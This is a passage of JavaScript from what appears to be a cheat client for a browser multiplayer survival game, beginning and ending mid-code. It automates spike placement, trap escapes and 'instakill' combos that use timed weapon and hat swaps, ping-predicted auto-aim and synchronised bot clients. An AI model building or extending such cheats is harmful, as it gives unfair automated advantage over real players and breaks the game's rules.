          const weaponRange = items.weapons[player.weapons[0]]?.range || 0;
          if (near.dist2 <= weaponRange + player.scale * 1.8 && AB.Menu.spikeTick) {
            instaC.canSpikeTick = true;
          }
        }
      } catch (err) { }
    };

    this.checkSpikeTick = function () {
      try {
        if (![3, 4, 5].includes(near.primaryIndex)) return false;

        const isReloading = near.reloads?.[near.primaryIndex] > game.tickRate;
        if (!my.autoPush || isReloading || !near.primaryIndex) return false;

        const weapon = items.weapons[near.primaryIndex];
        if (!weapon || near.dist2 > weapon.range + near.scale * 1.8) return false;

        const spikePriorities = [9, 8, 7, 6];
        let spikeSlot = -1;
        let selectedSpikeID = -1;

        for (const itemID of spikePriorities) {
          spikeSlot = player.items.findIndex(slotID => slotID === itemID);
          if (spikeSlot !== -1) {
            selectedSpikeID = itemID;
            break;
          }
        }
        if (spikeSlot === -1) return false;

        const spike = items.list.find(itm => itm.itemID === selectedSpikeID);
        if (!spike) return false;

        const safeDist = near.scale + spike.scale + (spike.placeOffset || 0);

        const riverMid = config.mapScale / 2;
        const riverMin = riverMid - config.riverWidth / 2;
        const riverMax = riverMid + config.riverWidth / 2;

        const baseAngle = UTILS.getDirect(player, near, 2, 2);
        const enemyInTrap = near.inTrap;
        const angleRange = enemyInTrap ? Math.PI * 2 : 0.9;

        let escapeAngle = baseAngle;

        if (near.x1 != null) {
          const vx = near.x2 - near.x1;
          const vy = near.y2 - near.y1;

          if (Math.abs(vx) + Math.abs(vy) > 0.01) {
            escapeAngle = Math.atan2(vy, vx);
          }
        }

        let angles = [];
        const step = 0.04;

        const startAngle = enemyInTrap ? 0 : baseAngle - angleRange / 2;
        const endAngle = enemyInTrap ? Math.PI * 2 : baseAngle + angleRange / 2;

        for (let angle = startAngle; angle <= endAngle; angle += step) {
          angles.push(angle);
          angles.push(angle + 0.02);
          angles.push(angle - 0.02);
        }

        if (enemyInTrap) {
          for (let i = 0; i < 8; i++) {
            angles.push(Math.random() * Math.PI * 2);
          }
        }

        /* ============================
   SORT BY ESCAPE, NOT PLAYER
   ============================ */
        angles.sort((a, b) =>
          Math.abs(UTILS.getAngleDist(escapeAngle, a)) -
          Math.abs(UTILS.getAngleDist(escapeAngle, b))
        );

        const activeObjects = liztobj.filter(obj => obj.active);

        for (const ang of angles) {
          const x = near.x2 + safeDist * Math.cos(ang);
          const y = near.y2 + safeDist * Math.sin(ang);

          if (y >= riverMin && y <= riverMax) continue;

          let blocked = false;
          for (const obj of activeObjects) {
            const objScale =
              obj.blocker ||
              obj.getScale?.(0.6, obj.isItem) ||
              obj.scale ||
              0;

            if (UTILS.getDistance(x, y, obj.x, obj.y) < spike.scale + objScale) {
              blocked = true;
              break;
            }
          }

          if (!blocked) {
            place(spikeSlot, ang, 1);

            if (near.dist2 <= 300) {
              my.anti0Tick = 1;
              healer();
            }

            return true;
          }
        }

        return false;

      } catch (err) {
        console.warn("checkSpikeTick error:", err);
        return false;
      }
    };

    this.replacer = function (findObj) {
      if (!findObj || !configs.autoReplace) return;
      if (!inGame || this.antiTrapped) return;
      if (!enemy.length || !near) return;
      if (near.dist2 > 600) return;

      const calculatePredictedDamage = (targetObj) => {
        if (!near || !near.primaryIndex) return 0;
        const weapon = items.weapons[near.primaryIndex];
        if (!weapon) return 0;
        let damage = weapon.dmg || 0;
        if (near.primaryVariant !== undefined) {
          const variant = config.weaponVariants[near.primaryVariant];
          if (variant && variant.val) damage *= variant.val;
        }
        if (weapon.sDmg) damage *= weapon.sDmg;
        if (near.skinIndex === 7) damage *= 1.5;
        if (near.skinIndex === 6) damage *= 0.75;
        if (
          near.skinIndex === 40 &&
          targetObj &&
          targetObj.group &&
          targetObj.group.name === "walls"
        )
          damage *= 3.3;
        return Math.max(1, damage);
      };

      const getHitsToBreak = (obj) => {
        const predictedDamage = calculatePredictedDamage(obj);
        if (predictedDamage <= 0 || !obj.health) return Infinity;
        return Math.ceil(obj.health / predictedDamage);
      };

      const willBreakNextTick = (obj) => getHitsToBreak(obj) <= 1;
      const willBreakSoon = (obj) => getHitsToBreak(obj) <= 3;

      if (
        findObj.trap &&
        !findObj.isTeamObject(player) &&
        willBreakNextTick(findObj)
      ) {
        this.antiRetrapBurst(findObj);
      }

      game.tickBase(() => {
        const objDist = UTILS.getDist(findObj, player, 0, 2);
        if (objDist > 350) return;

        const enemyToObjDist = UTILS.getDist(findObj, near, 0, 2);
        if (enemyToObjDist > 400) return;

        const enemyTrap = gameObjects.find(
          (obj) =>
            obj.active &&
            obj.trap &&
            (!obj.isTeamObject || !obj.isTeamObject(player)) &&
            UTILS.getDist(obj, near, 0, 2) <=
            (obj.getScale ? obj.getScale(0.6, obj.isItem) : obj.scale) +
            near.scale +
            10,
        );

        if (
          enemyTrap &&
          findObj.active &&
          findObj.dmg &&
          (!findObj.isTeamObject || !findObj.isTeamObject(player)) &&
          UTILS.getDist(findObj, enemyTrap, 0, 2) <=
          (enemyTrap.getScale
            ? enemyTrap.getScale(0.6, enemyTrap.isItem)
            : enemyTrap.scale) +
          120
        ) {
          const spikePriorities = [9, 8, 7, 6];
          let spikeSlot = -1;
          for (const id of spikePriorities) {
            spikeSlot = player.items.findIndex((s) => s === id);
            if (spikeSlot !== -1) break;
          }
          if (spikeSlot === -1) spikeSlot = 2;
          if (near.dist2 <= 350) {
            place(spikeSlot, UTILS.getDirect(player, findObj, 2, 2), 1);
            this.replaced = true;
            return;
          }
        }

        const hitsToBreak = getHitsToBreak(findObj);
        const objectCritical = hitsToBreak <= 1;
        const objectVulnerable = hitsToBreak <= 2;
        const objectAtRisk = hitsToBreak <= 4;

        if (objectCritical || objectVulnerable) {
          const spikePriorities = [9, 8, 7, 6];
          let spikeSlot = -1;
          for (const id of spikePriorities) {
            spikeSlot = player.items.findIndex((s) => s === id);
            if (spikeSlot !== -1) break;
          }

          if (spikeSlot !== -1 && near.dist2 <= 350) {
            const blockingAngles = this.getAngles(spikeSlot, 12, findObj, true);
            if (blockingAngles && blockingAngles.length > 0) {
              const enemyAngle = UTILS.getDirect(player, near, 2, 2);
              const enemyMovementDir = near.moveDir || enemyAngle;
              const objAngle = UTILS.getDirect(player, findObj, 2, 2);

              blockingAngles.sort((a, b) => {
                const enemyWeightA = Math.abs(
                  UTILS.getAngleDist(enemyMovementDir, a),
                );
                const enemyWeightB = Math.abs(
                  UTILS.getAngleDist(enemyMovementDir, b),
                );
                const objWeightA = Math.abs(UTILS.getAngleDist(objAngle, a));
                const objWeightB = Math.abs(UTILS.getAngleDist(objAngle, b));

                const enemyMultiplier = objectCritical ? 0.8 : 0.6;
                const totalA =
                  enemyWeightA * enemyMultiplier +
                  objWeightA * (1 - enemyMultiplier);
                const totalB =
                  enemyWeightB * enemyMultiplier +
                  objWeightB * (1 - enemyMultiplier);

                return totalA - totalB;
              });

              const spikesToPlace = objectCritical ? 3 : 2;
              for (
                let i = 0;
                i < Math.min(spikesToPlace, blockingAngles.length);
                i++
              ) {
                place(spikeSlot, blockingAngles[i], 1);
              }
            }

            const regularSpikeAngles = this.getAngles(2, 8, findObj, true);
            if (regularSpikeAngles && regularSpikeAngles.length > 0) {
              const objAngle = UTILS.getDirect(player, findObj, 2, 2);
              regularSpikeAngles.sort(
                (a, b) =>
                  Math.abs(UTILS.getAngleDist(objAngle, a)) -
                  Math.abs(UTILS.getAngleDist(objAngle, b)),
              );
              place(2, regularSpikeAngles[0], 1);
            }

            this.replaced = true;
            this.lastReplacedObj = {
              obj: findObj,
              tick: game.tick,
              anglesUsed: blockingAngles || [],
            };

            if (near.dist2 <= 180 && instaC) {
              instaC.canSpikeTick = true;
              setTimeout(() => {
                if (instaC.canSpikeTick) {
                  instaC.spikeTickType();
                  instaC.canSpikeTick = false;
                }
              }, 0);
            }

            setTimeout(() => {
              if (isObjectBroken(findObj)) {
                const followUpAngles = this.getAngles(spikeSlot, 8, null, true);
                if (followUpAngles && followUpAngles.length > 0) {
                  const objAngle = UTILS.getDirect(player, findObj, 2, 2);
                  followUpAngles.sort(
                    (a, b) =>
                      Math.abs(UTILS.getAngleDist(objAngle, a)) -
                      Math.abs(UTILS.getAngleDist(objAngle, b)),
                  );
                  for (let i = 0; i < Math.min(2, followUpAngles.length); i++) {
                    place(spikeSlot, followUpAngles[i], 1);
                  }
                }
              }
            }, game.tickRate * 2);
            return;
          }
        }

        if (objDist <= 300 && near.dist2 <= 450) {
          const weaponRange = items.weapons[near.primaryIndex || 5]?.range || 0;
          if (enemyToObjDist > weaponRange + near.scale * 1.8) return;

          const isObjectInDanger = () => {
            const angleToObj = UTILS.getDirect(near, findObj, 2, 2);
            const angleDiff = Math.abs(
              UTILS.getAngleDist(near.dir, angleToObj),
            );
            return (
              angleDiff < Math.PI / 3 &&
              enemyToObjDist <= weaponRange + near.scale * 1.8
            );
          };

          const shouldPlaceDefensively = objectAtRisk || isObjectInDanger();

          if (shouldPlaceDefensively) {
            const spikeAngles = this.getAngles(2, 10, findObj, true);
            if (spikeAngles && spikeAngles.length > 0) {
              const enemyAngle = UTILS.getDirect(player, near, 2, 2);
              const objAngle = UTILS.getDirect(player, findObj, 2, 2);

              spikeAngles.sort((a, b) => {
                const enemyWeightA = Math.abs(
                  UTILS.getAngleDist(enemyAngle, a),
                );
                const enemyWeightB = Math.abs(
                  UTILS.getAngleDist(enemyAngle, b),
                );
                const objWeightA = Math.abs(UTILS.getAngleDist(objAngle, a));
                const objWeightB = Math.abs(UTILS.getAngleDist(objAngle, b));

                const weightMultiplier = objectCritical
                  ? 0.9
                  : objectVulnerable
                    ? 0.75
                    : 0.6;
                const totalA =
                  enemyWeightA * weightMultiplier +
                  objWeightA * (1 - weightMultiplier);
                const totalB =
                  enemyWeightB * weightMultiplier +
                  objWeightB * (1 - weightMultiplier);

                return totalA - totalB;
              });

              const spikesToPlace = objectCritical
                ? 3
                : objectVulnerable
                  ? 2
                  : 1;
              for (
                let i = 0;
                i < Math.min(spikesToPlace, spikeAngles.length);
                i++
              ) {
                place(2, spikeAngles[i], 1);
              }
            }
          } else if (player.items[4] === 15 && near.dist2 > 250) {
            const millAngles = this.getAngles(4, 6, findObj, true);
            if (millAngles && millAngles.length > 0) {
              const objAngle = UTILS.getDirect(player, findObj, 2, 2);
              millAngles.sort(
                (a, b) =>
                  Math.abs(UTILS.getAngleDist(objAngle, a)) -
                  Math.abs(UTILS.getAngleDist(objAngle, b)),
              );
              place(4, millAngles[0], 1);
            }
          }

          this.replaced = true;
        }
      }, 1);
    };

    this.AntiTrap = function (id, x, y) {
      if (!configs.antiTrap) return;
      if (!player.items[2]) return;
      if (id !== 15 || Math.hypot(y - player.y2, x - player.x2) > 80) return;

      textManager.showText(
        player.x,
        player.y,
        30,
        0.18,
        500,
        "AntiTrap",
        "red",
      );
      Mod.Place.placeAround(2, 20);
    };
  }
}

class Instakill {
  constructor() {
    this.wait = false;
    this.can = false;
    this.isTrue = false;
    this.nobull = false;
    this.ticking = false;
    this.canSpikeTick = false;
    this.startTick = false;
    this.readyTick = false;
    this.canCounter = false;
    this.revTick = false;
    this.syncHit = false;
    this.usedAutoPush = false;
    this.instaType = null;
    this.lastTarget = null;
    this.velTickActive = false;

    this.setAutoPush = function () {
      this.usedAutoPush = true;
    };

    this.setInstaType = function (type) {
      if (this.instaType === "Spike Tick") return;
      this.instaType = type;
    };

    this.formatKillMessage = function (targetName) {
      if (!this.usedAutoPush && !this.instaType) {
        return `${targetName} commit suicide!`;
      }
      if (this.usedAutoPush && this.instaType) {
        return `Killed ${targetName} with AutoPush & ${this.instaType}!`;
      }
      if (this.usedAutoPush) {
        return `Killed ${targetName} with AutoPush!`;
      }
      return `Killed ${targetName} with ${this.instaType}!`;
    };

    this.resetKillData = function () {
      this.usedAutoPush = false;
      this.instaType = null;
    };

    this.velTickType = function () {
      try {
        if (this.isTrue) return;
        if (!AB.Menu.VelTick) return;
        if (!player || !player.alive || !inGame) return;
        if (!near || !near.alive || !enemy.length) return;
        if (!player.skins[53]) return;
        if (near.skinIndex == 6 || near.skinIndex == 22) return;
        if (player.reloads?.[53] > 0) return;
        if (my.autoPush) return;

        const now = Date.now();
        const targetSid = near.sid;

        const ping = window.pingTime ?? window.ping ?? 0;
        const tickMs = 1000 / (game.tickRate || 9);
        const getAim = (baseLeadTicks) => {
          if (!near || near.sid !== targetSid) return null;
          const vx0 = near.x1 != null ? near.x2 - near.x1 : 0;
          const vy0 = near.y1 != null ? near.y2 - near.y1 : 0;
          const s0 = Math.hypot(vx0, vy0);
          const pxNow = player.x2;
          const pyNow = player.y2;
          const pvx0 = this._velTickLastPx != null ? pxNow - this._velTickLastPx : 0;
          const pvy0 = this._velTickLastPy != null ? pyNow - this._velTickLastPy : 0;
          this._velTickLastPx = pxNow;
          this._velTickLastPy = pyNow;
          const ps0 = Math.hypot(pvx0, pvy0);
          if (this._velTickVx == null || this._velTickVy == null) {
            this._velTickVx = vx0;
            this._velTickVy = vy0;
          } else {
            const a = s0 > 0.35 ? 0.55 : 0.35;
            this._velTickVx = this._velTickVx * (1 - a) + vx0 * a;
            this._velTickVy = this._velTickVy * (1 - a) + vy0 * a;
          }
          if (this._velTickPVx == null || this._velTickPVy == null) {
            this._velTickPVx = pvx0;
            this._velTickPVy = pvy0;
          } else {
            const a = ps0 > 0.35 ? 0.65 : 0.35;
            this._velTickPVx = this._velTickPVx * (1 - a) + pvx0 * a;
            this._velTickPVy = this._velTickPVy * (1 - a) + pvy0 * a;
          }
          const leadTicks = Math.max(
            0,
            Math.min(10, Math.round((baseLeadTicks || 0) + ping / tickMs)),
          );
          if (s0 < 0.01 && ps0 < 0.01) return near.aim2;
          const shooterX = pxNow + (this._velTickPVx || 0) * leadTicks;
          const shooterY = pyNow + (this._velTickPVy || 0) * leadTicks;
          const predX = near.x2 + (this._velTickVx || 0) * leadTicks;
          const predY = near.y2 + (this._velTickVy || 0) * leadTicks;
          return Math.atan2(predY - shooterY, predX - shooterX);
        };

        const minRange =
          ping > 140 ? 230 : ping > 110 ? 210 : ping > 85 ? 190 : 170;
        const maxRange = 245;
        const effectiveMinRange = traps.inTrap ? 0 : minRange;
        const distToEnemy =
          near.dist2 !== undefined
            ? near.dist2
            : UTILS.getDist(player, near, 0, 2);
        if (!items?.weapons || player.weapons?.[0] === undefined) return;
        const weaponInfo = items.weapons[player.weapons[0]];
        const weaponRange = weaponInfo ? weaponInfo.range : 0;
        const weaponTriggerRange = weaponRange + near.scale * 1.8;

        const needsPlague =
          (player.primaryVariant < 2 && player.weapons[0] == 5) ||
          (player.primaryVariant < 3 && player.weapons[0] == 4);
        if (needsPlague) {
          const poisonFresh =
            near.lastPoisonAtMs && now - near.lastPoisonAtMs < 2500;
          const poisonPending =
            this._velPlaguePendingSid === near.sid &&
            this._velPlaguePendingUntil &&
            now < this._velPlaguePendingUntil;
          if (!poisonFresh) {
            if (poisonPending) return;
            if (this._velPlagueTagCdUntil && now < this._velPlagueTagCdUntil) return;
            this._velPlagueTagCdUntil = now + 250;
            if (distToEnemy > weaponTriggerRange) return;
            const prevAutoAim = my.autoAim;
            const prevTail = player.tailIndex ?? 0;
            const wantsShadowWings = !useWasd;
            my.autoAim = true;
            buyEquip(21, wantsShadowWings ? 19 : prevTail);
            packet("9", getAim(1) ?? near.aim2, 1);
            sendAtck(1);
            sendAtck(0);
            this._velPlaguePendingSid = near.sid;
            this._velPlaguePendingUntil = now + 1500;
            game.tickBase(() => {
              if (!this.isTrue && !prevAutoAim) my.autoAim = false;
              if (
                !this.isTrue &&
                wantsShadowWings &&
                prevTail !== 19 &&
                player.tailIndex === 19
              ) {
                buyEquip(prevTail, 1);
              }
            }, 1);
            return;
          }
        }

        if (this._velRetreatSid === near.sid) {
          const playerMoving = player.moveDir !== undefined;
          if (playerMoving || traps.inTrap) {
            packet("a", undefined, 1);
            this._velRetreatSid = null;
            this._velRetreatUntil = 0;
          } else if (
            distToEnemy < effectiveMinRange &&
            this._velRetreatUntil &&
            now < this._velRetreatUntil
          ) {
            packet("a", UTILS.getDirect(player, near, 2, 2), 1);
            return;
          } else {
            packet("a", undefined, 1);
            this._velRetreatSid = null;
            this._velRetreatUntil = 0;
          }
        }

        if (distToEnemy < effectiveMinRange) {
          if (needsPlague) {
            const playerMoving = player.moveDir !== undefined;
            if (!playerMoving && !traps.inTrap) {
              packet("a", UTILS.getDirect(player, near, 2, 2), 1);
              this._velRetreatSid = near.sid;
              this._velRetreatUntil = now + 800;
            }
          }
          return;
        }

        if (distToEnemy > maxRange) return;

        if (this._velTickCdUntil && now < this._velTickCdUntil && !traps.inTrap) return;

        if (needsPlague) {
          if (
            player.weapons[1] !== undefined &&
            player.reloads?.[player.weapons[1]] > 0
          ) {
            return;
          }
          if (near.poisonTick === undefined || !config.serverUpdateRate) return;
          const poisonPhase =
            ((game.tick - near.poisonTick) % config.serverUpdateRate + config.serverUpdateRate) %
            config.serverUpdateRate;
          if (poisonPhase !== 7 && poisonPhase !== 8 && poisonPhase !== 9) return;
        }

        this._velTickCdUntil = now + (traps.inTrap ? 1500 : 5000);
        this.setInstaType("VelTick");
        this.lastTarget = near?.name || "Unknown";
        notif("Vel Tick");
        this.isTrue = true;
        my.autoAim = true;
        if (this._velRetreatSid) {
          packet("a", undefined, 1);
          this._velRetreatSid = null;
          this._velRetreatUntil = 0;
        }
        if (distToEnemy <= weaponTriggerRange) packet("9", undefined, 1);
        const isAlt = [10, 14].includes(player.weapons[1]);
        const tickWeapon = player.weapons[isAlt ? 1 : 0];
        selectWeapon(tickWeapon);
        biomeGear();
        buyEquip(11, 1);
        packet("9", getAim(3) ?? near.aim2, 1);
        game.tickBase(() => {
          selectWeapon(tickWeapon);
          buyEquip(53, 0);
          buyEquip(11, 1);
          packet("9", getAim(2) ?? near.aim2, 1);
          game.tickBase(() => {
            selectWeapon(player.weapons[0]);
            buyEquip(7, 0);
            buyEquip(19, 1);
            sendAutoGather();
            packet("9", getAim(1) ?? near.aim2, 1);
            game.tickBase(() => {
              sendAutoGather();
              this.isTrue = false;
              my.autoAim = false;
              packet("9", undefined, 1);
              if (this._velRetreatSid) {
                packet("a", undefined, 1);
                this._velRetreatSid = null;
                this._velRetreatUntil = 0;
              }
            }, 1);
          }, 1);
        }, 1);
      } catch (err) {
        this.isTrue = false;
        my.autoAim = false;
        packet("9", undefined, 1);
        packet("a", undefined, 1);
        this._velRetreatSid = null;
        this._velRetreatUntil = 0;
      }
    };

    this.changeType = function (type) {
      this.wait = false;
      this.isTrue = true;
      my.autoAim = true;
      near.backupNobull = AB.Menu.backupNobull !== false;

      this.syncBotsInsta(type);

      const actions = {
        rev: () => this.revInstakill(),
        nobull: () => this.noBullInstakill(),
        normal: () => this.normalInstakill(),
        default: () => {
          setTimeout(() => {
            this.isTrue = false;
            my.autoAim = false;
          }, 50);
        },
      };

      (actions[type] || actions.default)();
    };

    this.syncBotsInsta = function (type) {
      if (typeof botClients !== "undefined" && botClients.length > 0) {
        botClients.forEach((client) => {
          if (
            client &&
            client.instakill &&
            client.near &&
            client.Bot &&
            client.Bot.alive
          ) {
            const canInsta = client.instakill.checkCanInsta();
            if (canInsta >= 95) {
              client.instakill.can = true;
              client.instakill.performInsta(type);
            }
          }
        });
      }
    };

    function notif(title, description) {
      let mouseCoord = player;
      let m = textManager;
      textManager.showText(
        mouseCoord.x,
        mouseCoord.y,
        30,
        0.18,
        500,
        title,
        "white",
      );
    }

    this.revInstakill = function () {
      notif("Rev Insta");
      this.setInstaType("Rev Insta");
      this.lastTarget = near?.name || "Unknown";
      healer1();
      selectWeapon(player.weapons[1]);
      buyEquip(53, 0);
      sendAutoGather();
      const instaSpeed = AB.Menu.InstaSpeed || 99;
      setTimeout(() => {
        selectWeapon(player.weapons[0]);
        buyEquip(7, 0);
        setTimeout(() => {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
        }, instaSpeed + 126);
      }, instaSpeed + 1);
    };

    this.noBullInstakill = function () {
      notif("No Bull Insta");
      this.setInstaType("No Bull Insta");
      this.lastTarget = near?.name || "Unknown";
      selectWeapon(player.weapons[0]);
      healer1();
      buyEquip(7, 21);
      sendAutoGather();
      const instaSpeed = AB.Menu.InstaSpeed || 99;
      setTimeout(() => {
        selectWeapon(player.weapons[1]);
        buyEquip(player.reloads[53] == 0 ? 53 : 6, 0);
        setTimeout(() => {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
        }, instaSpeed + 126);
      }, instaSpeed + 6);
    };

    this.normalInstakill = function () {
      notif("Insta");
      this.setInstaType("Insta");
      this.lastTarget = near?.name || "Unknown";
      if (player.weapons[1] === 10) {
        this.revInstakill();
        return;
      }

      selectWeapon(player.weapons[0]);
      buyEquip(7, 21);
      sendAutoGather();
      const instaSpeed = AB.Menu.InstaSpeed || 99;
      setTimeout(() => {
        selectWeapon(player.weapons[1]);
        buyEquip(player.reloads[53] == 0 ? 53 : 6, 0);
        setTimeout(() => {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
        }, instaSpeed);
      }, instaSpeed);
    };

    this.spikeTickType = function () {
      this.setInstaType("Spike Tick");
      this.lastTarget = near?.name || "Unknown";
      this.isTrue = true;
      my.autoAim = true;
      selectWeapon(player.weapons[0]);
      buyEquip(7, 0);
      sendAutoGather();
      game.tickBase(() => {
        buyEquip(53, 0);
        selectWeapon(player.weapons[0]);
        buyEquip(53, 0);
        game.tickBase(() => {
          sendAutoGather();
          if (player.weapons[1] === 10) {
            selectWeapon(player.weapons[1]);
          }
          this.isTrue = false;
          my.autoAim = false;
          buyEquip(6, 21);
        }, 3);
      }, 1);
    };

    this.counterType = function () {
      if (AB.Menu.counterTick) {
        notif("Counter Tick")
        this.setInstaType("Counter Tick");
        this.isTrue = true;
        my.autoAim = true;
        selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
        biomeGear();
        buyEquip(11, 1);
        packet("9", near.aim2, 1);
        game.tickBase(() => {
          selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
          buyEquip(53, 0);
          buyEquip(11, 1);
          packet("9", near.aim2, 1);
          game.tickBase(() => {
            selectWeapon(player.weapons[0]);
            buyEquip(7, 0);
            buyEquip(19, 1);
            sendAutoGather();
            packet("9", near.aim2, 1);
            game.tickBase(() => {
              sendAutoGather();
              this.isTrue = false;
              my.autoAim = false;
              packet("9", undefined, 1);
            }, 1);
          }, 1);
        }, 1);
      } else {
        notif("Counter Insta");
        this.setInstaType("Counter Insta");
        this.lastTarget = near?.name || "Unknown";
        this.isTrue = true;
        my.autoAim = true;
        my.revAim = true;
        if (!recording) {
          Mod.sendChat("Abyss | Counter");
        }
        selectWeapon(player.weapons[1]);
        buyEquip(53, 19);
        sendAutoGather();
        packet("a", near.aim2, 1);
        game.tickBase(() => {
          my.revAim = false;
          selectWeapon(player.weapons[0]);
          buyEquip(7, 19);
          packet("a", near.aim2, 1);
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
            packet("a", undefined, 1);
          }, 1);
        }, 1);
      }
    };

    this.antiCounterType = function () {
      notif("Anti Counter");
      this.setInstaType("Anti Counter");
      this.lastTarget = near?.name || "Unknown";
      my.autoAim = true;
      this.isTrue = true;
      selectWeapon(player.weapons[0]);
      buyEquip(6, 21);
      io.send("D", near.aim2);
      sendAutoGather();
      game.tickBase(() => {
        buyEquip(player.reloads[53] == 0 ? (player.skins[53] ? 53 : 6) : 6, 0);
        buyEquip(21, 1);
        game.tickBase(() => {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
        }, 1);
      }, 1);
    };

    this.rangeType = function (type) {
      this.isTrue = true;
      my.autoAim = true;

      if (type === "ageInsta") {
        this.ageInstaKill();
      } else {
        this.rangeInstaKill();
      }
    };

    this.ageInstaKill = function () {
      notif("Age Insta");
      this.setInstaType("Age Insta");
      this.lastTarget = near?.name || "Unknown";
      my.ageInsta = false;
      if (player.items[5] === 18) {
        Mod.place(5, near.aim2);
      }
      packet("a", undefined, 1);
      buyEquip(22, 21);
      game.tickBase(() => {
        selectWeapon(player.weapons[1]);
        buyEquip(53, 21);
        sendAutoGather();
        game.tickBase(() => {
          sendUpgrade(12);
          selectWeapon(player.weapons[1]);
          buyEquip(53, 21);
          game.tickBase(() => {
            sendUpgrade(15);
            selectWeapon(player.weapons[1]);
            buyEquip(53, 21);
            game.tickBase(() => {
              sendAutoGather();
              this.isTrue = false;
              my.autoAim = false;
            }, 1);
          }, 1);
        }, 1);
      }, 1);
    };

    this.rangeInstaKill = function () {
      notif("Range Insta");
      this.setInstaType("Range Insta");
      this.lastTarget = near?.name || "Unknown";
      selectWeapon(player.weapons[1]);
      if (
        player.reloads[53] == 0 &&
        near &&
        near.dist2 !== undefined &&
        near.dist2 <= 700 &&
        near.skinIndex != 22
      ) {
        buyEquip(53, 0);
      } else {
        buyEquip(20, 0);
      }
      buyEquip(11, 0);
      sendAutoGather();
      game.tickBase(() => {
        sendAutoGather();
        this.isTrue = false;
        my.autoAim = false;
      }, 1);
    };

    this.oneTickType = function () {
      notif("One Tick");
      this.setInstaType("One Tick");
      this.lastTarget = near?.name || "Unknown";
      this.isTrue = true;
      my.autoAim = true;
      selectWeapon(player.weapons[1]);
      buyEquip(53, 19);
      packet("a", near.aim2, 1);
      if (player.weapons[1] == 15) {
        my.revAim = true;
        sendAutoGather();
      }
      game.tickBase(() => {
        my.revAim = false;
        selectWeapon(player.weapons[0]);
        buyEquip(7, 19);
        packet("a", near.aim2, 1);
        if (player.weapons[1] != 15) {
          sendAutoGather();
        }
        game.tickBase(() => {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
          packet("a", undefined, 1);
        }, 1);
      }, 1);
    };

    this.threeOneTickType = function () {
      notif("One Tick 3");
      this.isTrue = true;
      my.autoAim = true;
      selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
      biomeGear();
      buyEquip(11, 1);
      packet("9", near.aim2, 1);
      game.tickBase(() => {
        selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
        buyEquip(53, 0);
        buyEquip(11, 1);
        packet("9", near.aim2, 1);
        game.tickBase(() => {
          selectWeapon(player.weapons[0]);
          buyEquip(7, 0);
          buyEquip(19, 1);
          sendAutoGather();
          packet("9", near.aim2, 1);
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
            packet("9", undefined, 1);
          }, 1);
        }, 1);
      }, 1);
    };

    this.oneFrameType = function () {
      notif("One Frame");
      this.isTrue = true;
      my.autoAim = true;
      const aimDir = near.aim2;
      selectWeapon(player.weapons[1]);
      packet("a", aimDir, 1);
      buyEquip(53, 19);
      setTimeout(() => {
        selectWeapon(player.weapons[0]);
        buyEquip(7, 21);
        packet("d", 1, aimDir, 1);
      }, 200);
      setTimeout(() => {
        my.autoAim = false;
        selectWeapon(player.weapons[0]);
        Mod.biomeGear();
        packet("d", 0, aimDir, 1);
        this.isTrue = false;
      }, 350);
      setTimeout(() => {
        packet("a", undefined, 1);
      }, 510);
    };

    this.kmTickType = function () {
      notif("KM Tick");
      this.isTrue = true;
      my.autoAim = true;
      my.revAim = true;
      selectWeapon(player.weapons[1]);
      buyEquip(53, 19);
      sendAutoGather();
      packet("a", near.aim2, 1);
      game.tickBase(() => {
        my.revAim = false;
        selectWeapon(player.weapons[0]);
        buyEquip(7, 19);
        packet("a", near.aim2, 1);
        game.tickBase(() => {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
          packet("a", undefined, 1);
        }, 1);
      }, 1);
    };

    this.boostTickActive = false;
    this.boostTickInterval = null;
    this.boostRange = 500;
    this.currentTarget = null;
    this.boostVelocity = 0.8;
    this.canExecute = true;

    this.boostTickType = function () {
      this.isTrue = true;
      my.autoAim = true;
      biomeGear();
      buyEquip(11, 1);
      packet("9", near.aim2, 1);
      game.tickBase(() => {
        if (player.weapons[1] == 15) {
          my.revAim = true;
        }
        selectWeapon(player.weapons[[9, 12, 13, 15].includes(player.weapons[1]) ? 1 : 0]);
        buyEquip(53, 0);
        buyEquip(11, 1);
        if ([9, 12, 13, 15].includes(player.weapons[1])) {
          sendAutoGather();
        }
        packet("9", near.aim2, 1);
        place(4, near.aim2);
        game.tickBase(() => {
          my.revAim = false;
          selectWeapon(player.weapons[0]);
          buyEquip(7, 0);
          buyEquip(19, 1);
          if (![9, 12, 13, 15].includes(player.weapons[1])) {
            sendAutoGather();
          }
          packet("9", near.aim2, 1);
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
            packet("9", undefined, 1);
          }, 1);
        }, 1);
      }, 1);
    };
    this.gotoGoal = function (goto, OT) {
      let slowDists = (weeeee) => weeeee * config.playerScale;
      let goal = {
        a: goto - OT,
        b: goto + OT,
        c: goto - slowDists(1),
        d: goto + slowDists(1),
        e: goto - slowDists(2),
        f: goto + slowDists(2),
        g: goto - slowDists(4),
        h: goto + slowDists(4)
      };
      let bQ = function (wwww, awwww) {
        if (player.y2 >= config.mapScale / 2 - config.riverWidth / 2 && player.y2 <= config.mapScale / 2 + config.riverWidth / 2 && awwww == 0) {
          buyEquip(31, 0);
        } else {
          buyEquip(wwww, awwww);
        }
      }
      if (enemy.length) {
        let dst = near.dist2;
        this.ticking = true;
        if (dst >= goal.a && dst <= goal.b) {
          bQ(22, 11);
          if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
            selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
          }
          return {
            dir: undefined,
            action: 1
          };
        } else {
          if (dst < goal.a) {
            if (dst >= goal.g) {
              if (dst >= goal.e) {
                if (dst >= goal.c) {
                  bQ(40, 10);
                  if (configs.slowOT) {
